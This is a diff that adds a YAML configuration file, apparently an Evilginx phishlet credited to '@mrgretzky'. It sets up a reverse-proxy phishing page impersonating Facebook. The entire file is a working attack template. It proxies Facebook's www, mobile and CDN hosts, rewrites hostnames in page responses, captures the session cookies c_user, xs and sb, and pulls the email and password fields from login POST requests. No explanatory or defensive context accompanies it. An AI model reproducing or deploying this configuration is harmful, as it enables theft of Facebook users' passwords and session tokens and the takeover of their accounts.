@@ -1,0 +1,30 @@
+author: '@mrgretzky'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.facebook.com'
+    keys: ['c_user','xs','sb']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.facebook.com'
+  path: '/login.php'
